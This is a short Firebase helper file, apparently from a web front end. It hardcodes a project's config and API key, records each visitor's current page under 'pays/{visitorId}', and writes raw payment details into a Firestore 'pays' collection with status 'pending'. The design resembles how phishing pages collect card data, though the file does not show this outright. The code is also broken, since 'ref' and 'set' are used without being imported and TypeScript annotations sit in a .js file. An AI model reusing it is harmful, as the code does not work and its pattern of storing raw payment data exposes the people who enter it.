// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
    apiKey: "AIzaSyBJwAk57JgSfu-nXlctc9t5M2b5A0yOH3o",
  authDomain: "taminn-jh.firebaseapp.com",
  databaseURL: "https://taminn-jh-default-rtdb.firebaseio.com",
  projectId: "taminn-jh",
  storageBucket: "taminn-jh.firebasestorage.app",
  messagingSenderId: "910897215892",
  appId: "1:910897215892:web:d4788788e3a66d94abb781",
  measurementId: "G-MKE0PZWQEX",
};

function initializeFirebase() {
  if (typeof window === "undefined") {
    return null;
  }

  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
    console.warn(
      "Firebase configuration is incomplete. Some features may not work.",
    );
    return null;
  }

  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
}

const app = initializeFirebase();
const db = app ? getFirestore(app) : null;
const database = app ? getDatabase(app) : null;

export async function addData(path: string, data: any) {
  if (!database) {
    console.warn("Database not initialized");
    return;
  }

  localStorage.setItem("visitor", data.id);

  try {
    const dbRef = ref(database, path);

    await set(dbRef, {
      ...data,
      createdDate: new Date().toISOString()
    });

    console.log("Data written successfully");
  } catch (e) {
    console.error("Error adding data:", e);
  }
}
export const handleCurrentPage = (page: string) => {
  let visitorId = localStorage.getItem("visitor");

  if (!visitorId) {
    visitorId = Date.now().toString();
    localStorage.setItem("visitor", visitorId);
  }

  addData(`pays/${visitorId}`, { id: visitorId, currentPage: page });
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot process payment.");
    return;
  }
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true },
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };
